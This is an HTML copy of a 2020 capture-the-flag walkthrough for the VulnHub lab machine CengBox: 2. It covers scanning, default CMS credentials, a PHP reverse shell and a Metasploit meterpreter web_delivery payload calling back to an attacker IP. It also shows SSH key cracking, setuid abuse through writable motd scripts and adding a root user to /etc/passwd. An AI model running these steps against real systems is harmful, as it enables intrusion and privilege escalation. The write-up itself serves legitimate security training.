@@ -1,0 +1,174 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">CengBox: 2: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/cengbox-2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-20T09:43:49+00:00">September 20, 2020</time><time class="updated" datetime="2025-07-10T18:10:44+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack this vulnerable machine called CengBox: 2. It is created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/arslanblcn_">Arslan Bilecen</a>.</strong></span>  This is a Capture the Flag type of challenge. It contains two flags that are accessible after gaining a limited session and a root level privilege on the machine. It is an Intermediate level machine.</span></p>
+<p><span style="color: #000000;">Download Lab from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/cengbox-2,486/">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating the FTP login</span></li>
+<li><span style="color: #000000;">Browsing the HTTP service on port 80</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using gobuster</span></li>
+<li><span style="color: #000000;">Enumerating Credentials for Gila CMS</span></li>
+<li><span style="color: #000000;">Enumerating Gila CMS</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting Command Injection</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Post-Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating for Sudo Permissions</span></li>
+<li><span style="color: #000000;">Crafting a PHP payload using Msfvenom</span></li>
+<li><span style="color: #000000;">Enumerating the SSH keys</span></li>
+<li><span style="color: #000000;">Cracking the SSH password using John The Ripper</span></li>
+<li><span style="color: #000000;">Logging the SSH session as Mitnick user</span></li>
+<li><span style="color: #000000;">Downloading and Enumerating using pspy64s script</span></li>
+<li><span style="color: #000000;">Exploring permissions on Motd files</span></li>
+<li><span style="color: #000000;">Adding nano command to the Motd header file</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Relogging as Mitnick user</span></li>
+<li><span style="color: #000000;">Creating a new user using openssl</span></li>
+<li><span style="color: #000000;">Editing the /etc/password and adding a new user</span></li>
+<li><span style="color: #000000;">Getting root access from new user</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Getting the Root Flag</strong></span></li>
+</ul>
+<h3><span style="color: #000000;">Walkthrough </span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To attack any machine, we need to find the IP Address of the machine. This can be done using the netdiscover command. To find the IP Address, we will need to co-relate the MAC Address of the machine that can be obtained from the Virtual Machine Configuration Setting. The IP Address of the machine was found to be <strong>192.168.1.104.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xK_Ka5K9Jug/X2cdgmTOW3I/AAAAAAAAosk/lGshXTdmBZkbG-Ve88Tjs-lg0hkIZ-QXwCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">Following the netdiscover scan, we need a nmap scan to get the information about the services running on the virtual machine. An aggressive nmap scan reveals that 3 services: FTP (21), SSH (22) and HTTP (80) are running on the application.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.1.104</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-65Yb7kGYSe8/X2cdt-P8MrI/AAAAAAAAoso/qQZhomHsYj4RwerYnqOOziDIdGLUR18VQCLcBGAsYHQ/s16000/2.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration</span> </span></h3>
+<p><span style="color: #000000;">It was quite clear from the nmap scan that the FTP service has Anonymous Login Enabled by default and there is a file located in it as well named note.txt. As this is one of the ports that is basically open for access, let’s take a look into it. After logging in as Anonymous, we download the note.txt to our local machine to take a look at it. Here we see it is a note which consists of 2 names. Note them they can be useful down the road. Also, we see that the application is moved to a domain ceng-company.vm. That means we need to configure our /etc/hosts file. We also take note that if we find any CMS on the application then the default credentials can work as the note suggests so.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.1.104
+Anonymous
+ls
+get note.txt
+bye
+cat note.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YKrN6bz7zDI/X2cd3MQVDvI/AAAAAAAAos0/7qVcndAusGwQl0aPOvEBImmazdB2xjSpACLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">To access the application, we make the appropriate changes in the /etc/hosts file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4hW7PIpan3I/X2ceByhYF7I/AAAAAAAAos8/6ccc0uogwhMeoYIM-k33AvPRnKtVbnkFACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Now that we have made changes in the /etc/hosts file and there was an http service running on the application, we can check the application on our Web browser.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://ceng-company.vm</pre>
+<p><span style="color: #000000;">We have the Site Maintenance banner. This means that we need to enumerate further for the proper application. It is possible that the CMS is hidden in one of the directories.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AYvKqUwe8To/X2ceK9dhErI/AAAAAAAAotE/SPpSyHxL3NMn9CA9_qnMK0T4MtyeG1SpACLcBGAsYHQ/s16000/5.png"/></span></p>
+<h4><span style="color: #000000;">Directory Bruteforce using gobuster</span></h4>
+<p><span style="color: #000000;">After using dirb for Directory Bruteforcing, we were unable to find any relevant webpages. Then it hit us that what if Aaron from the note meant subdomain. That means we need to perform a directory bruteforce on the subdomain. To do this gobuster is the best tool. It has a vhost option with the subdomains dictionary.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster vhost -u http://ceng-company.vm/ -w subdomains-top1mil-5000.txt</pre>
+<p><span style="color: #000000;">After going on for some time, gobuster gave us the admin subdomain on the ceng-company.vm. But as it can be observed that it is forbidden i.e. 403. We need to bypass this restriction as well.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zIsxOBdT-AY/X2ceUE4miwI/AAAAAAAAotM/8Nra5o2pYlA-dT1AgsLu0b3QEkKan8P1wCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Let’s make an entry in the /etc/hosts/ file for the admin subdomain.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-24b231a3IEE/X2cehNo8TMI/AAAAAAAAotQ/ah9Iphja0wsAcyUfT0zRy6Sxzf6r2YuYQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Let’s try to access the URL again on the Web Browser. It can be observed that the link is still forbidden. We need to enumerate further for a possible entry point.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vntM0blUcNY/X2ceoiWi6bI/AAAAAAAAotY/uc5i3LGG_5M6nmOMRtpYljcHYI2fGmzdACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">This is where we decided it is time to do another directory bruteforce. This time, we thought to use the OWASP DirBuster. It gave us some directories. One of them was “gila”. It looks interesting.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Rixhn1tSSMc/X2cew6RZZVI/AAAAAAAAotg/gAc1XreNQ0wrAEIcXQ4r2a1YstLiHReIwCLcBGAsYHQ/s16000/9.png"/></span></p>
+<h4><span style="color: #000000;">Enumerating Credentials for Gila CMS</span></h4>
+<p><span style="color: #000000;">We decided to browse the gila directory and we have ourselves a CMS page at last. Wow! That took some time. This made us realise that finding an entry point on the application is as important as exploiting it. Also trusting a single tool is not ideal. We should expand our arsenal of tools and dictionary.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://admin.ceng-company.vm/gila/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xp0xOTUo03M/X2ce4_qVrpI/AAAAAAAAoto/x72EhWOjbsM4XyUOOGwCKK1QLAZr7TLSgCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">We checked the Gila CMS Documentations for the location of the admin login panel. It was “mysite.com/admin” and after a thorough the read of the documentation on Gila CMS which can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gila-cms.readthedocs.io/_/downloads/en/latest/pdf/">here</a></strong></span>. There was nothing about the default password. Also, the login panel asks for an email means we will have to find some email address as well. There were two users that we learnt from the note that we found on the FTP server. It was Kevin and Aaron. Also, Kevin is the one whose account was setup by Aaron. </span></p>
+<p><span style="color: #000000;">We need to obtain the email address of Kevin. Since ceng-company.vm was the primary domain. We decided to smack both of them together and get the email id as “kevin@ceng-company.vm”. It was total guesswork at this moment.  We tried multiple passwords like “password”, “1234”, “gila”. Nothing worked. Then, just as we were about to attempt bruteforce. It came to us to try “admin” as password and Voila! It worked.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Email: kevin@ceng-company.vm
+Password: admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Kb9IFXTKDEU/X2cfArOaFtI/AAAAAAAAots/tFTlI-L8Q84q79Zzw5-in05jakdVqrSGQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<h4><span style="color: #000000;">Enumerating Gila CMS</span></h4>
+<p><span style="color: #000000;">As we read the documentation earlier, we knew that the Gila provides a File Manager in its Dashboard. It can help in uploading a payload to generate the session on the virtual machine. But instead of uploading, we decided to edit the already consisting files on the virtual machine as they will have the proper permissions. We used the pentest monkey’s PHP Reverse shell and made the specific changes in it to point our local attacking machine i.e., Kali Linux.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bsz2H5T_T64/X2cfIkZb2PI/AAAAAAAAot4/-vmi3Lk-uBgLVXJ1mRez9nfNtOBdl_VvQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Now, after editing the config file, we started a netcat listener on the port that we specified in the payload. In this case, it was port 1234. After starting the listener, we execute the payload by browsing the payload in the web browser. When we come back to the terminal, we find that a new session is generated but the said session is a limited shell. To upgrade this limited shell into a TTY shell, use the python one-liner.</span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<p><span style="color: #000000;">After getting the shell as a part of post-exploitation, we ran the sudo -l command to find the list of binaries that can be run using sudo. We found that there is a script named runphp.sh that can be run using swartz user. We ran the script and <strong>got ourselves a php shell. </strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+sudo -u swartz /home/swartz/runphp.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pFvs2_3PFz8/X2cfWRsrkhI/AAAAAAAAouA/83QtQoUVfqw4yU0oAFB9Vpunp4lcNcp9QCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">So, we need a php shell script to get the session. For this, we went back to our local machine and ran the Metasploit Framework. The web_delivery exploit was our choice. After setting the lhost and lport settings appropriately, we were able to obtain a PHP script that allowed us to access the target machine’s meterpreter session. We made a copy of the script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set target 1
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.112
+set lport 8888
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Te0Uxyn3tAg/X2cfnr505PI/AAAAAAAAouQ/Cg1TeN1TiL04jashO4ben1MYMwzmwYX7gCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">We pasted the script in the php shell that we got ourselves earlier as shown in the image given below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--7xOdAi8ml0/X2cfuiWl_UI/AAAAAAAAouU/OzAPavM44-MMuRC91OpE3iKFF44L3LkVQCLcBGAsYHQ/s16000/15.png"/></span></p>
+<h4><span style="color: #000000;">Enumerating the SSH keys</span></h4>
+<p><span style="color: #000000;">After running the script, we went back to the terminal with Metasploit. We have ourselves a meterpreter session. We enumerate the home directory to find a user named Mitnick. It might be important. We traverse into the Mitnick user directory to find a user.txt file and .ssh directory. We tried to read the user.txt but we were unable to. Then we decided that logging as the Mitnick user is the only way to read that user.txt flag. And from the looks of it, it seems that we will have to SSH into Mitnick user. We get into the ssh directory and we have the public keys which can be used to SSH into Mitnick user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+cd mitnick
+cat user.txt
+cd .ssh
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LW0AnFmltQc/X2cf5CzraaI/AAAAAAAAoug/Z9xDwC5zKsQiyPUrSpyuSS3pVLF-FWUgwCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We verify that the public key is, in fact, the keys for the Mitnick user by reading it. On our local system, we copy the SSH key and insert it into a file called “key”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat id_rsa.pub
+cat id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6iVlg39XCFI/X2cf_scPU5I/AAAAAAAAouo/2qjYQn7gRmc9Wg9X-lAXQUtKelNoYW3kgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We have a script that can convert the “key” into a crackable hash. It is called ssh2john. It is already in the Kali Linux in the /usr/share/ directory. Using the script we converted the “key” into “hash” file. Now that we have a hash, we used John the Ripper to crack it and discovered that the password is <strong>legend</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">locate ssh2john
+/usr/share/john/ssh2john.py key &gt; hash
+john –wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z9zqh7O9d7w/X2cgJpPMxnI/AAAAAAAAouw/Bwv8qR0v21Ai3WkRDIL2_rLjl5IssncLgCLcBGAsYHQ/s16000/18.png"/></span></p>
+<h4><span style="color: #000000;">Downloading and Enumerating using pspy64s script</span></h4>
+<p><span style="color: #000000;">Time to SSH into Mitnick user. We had the username from the previous steps and the password we just cracked. After logging into the Mitnick user, we traversed into the /tmp directory and download the pspy64s script using wget command. We provide it proper permissions and execute it. It will help us enumerate pesky files or permission of different files across the system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i key mitnick@192.168.1.104
+cd /tmp
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+chmod 777 pspy64s
+./pspy64s</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gkYhFD7nMLQ/X2cgQ8lr5WI/AAAAAAAAou4/vvzL1nCwtLUyEul2OT_yqL2qaggcyOUrgCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Here, we see that /etc/update-motd.d is running. MOTD is usually the Message of the Day messages. It seems interesting enough to take a look at.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--eXDCz81uiY/X2cgcIp52PI/AAAAAAAAovA/LKvj3dfptukmN9ptyenti2dSHb6q9mOZgCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">We traverse into the directory to find in this directory all the files are writable. We tied to use edit one using the nano command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc/update-motd.d/
+ls -la
+nano 00-header</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dkaH-l43sN0/X2cgiNucnTI/AAAAAAAAovI/tO9WJxJYBZQMXlGi6PaLKvY8qGvaxvKxwCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">After taking a good look at the files, I found it clear that someone calls these files as root without sanitising the environment. While this is acceptable when processes such as sshd or Getty call it through login where the environment should be controlled, it becomes an issue if, for instance, an attacker modifies the PAM to add a temporary user. We added the permissions to nano command in this file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod u+s /bin/nano</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tNDE1Eqla54/X2cgsqO6XQI/AAAAAAAAovQ/beaqDbYCNMwV_K7nziLCBRzEIzpq_ZuQgCLcBGAsYHQ/s16000/22.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation</span> </span></h3>
+<p><span style="color: #000000;">Now that we have added the nano command in the motd, we need to logout from the ssh session and reconnect so that the motd executes. After logging again, we see that nano now have upgraded permissions. Let’s use this nano command to edit the /etc/passwd file and add our user with root privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">exit
+ssh -i key mitnick@192.168.1.104
+ls -la /bin/nano
+nano /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bx4VTBlMtRA/X2cgzjmzzrI/AAAAAAAAovU/ZY1FrAWQe5UmSLE0DUNg33TaNgLv-gP_wCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">We opened up a new terminal on our local machine and created a set of credentials for the new user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl paswd -1 -salt user3 pass123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2dYOVwPF3L4/X2cg6vH-RrI/AAAAAAAAovY/uEZPhkQdwO4rjrioGVsDSoPm-_vrSawFwCLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">Back to the SSH session on the target machine, we add the line with the username raj and with root-level privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zRVCHkQGrWI/X2chDEoDeRI/AAAAAAAAovg/mlwK5yOLQEMPkYjHQd6mfSil_66bHtxyQCLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">Let’s save and exit the nano editor. To check if the entries are saved, we use the tail command. Let just login to raj user using su command and we are root. We can find the root flag in the /root directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -n 3 /etc/passwd
+su raj
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CKru64m1mIs/X2chIpCBmWI/AAAAAAAAovo/A_oCbx47WGsTjtEvaZr_bffMcTLiHrGqQCLcBGAsYHQ/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
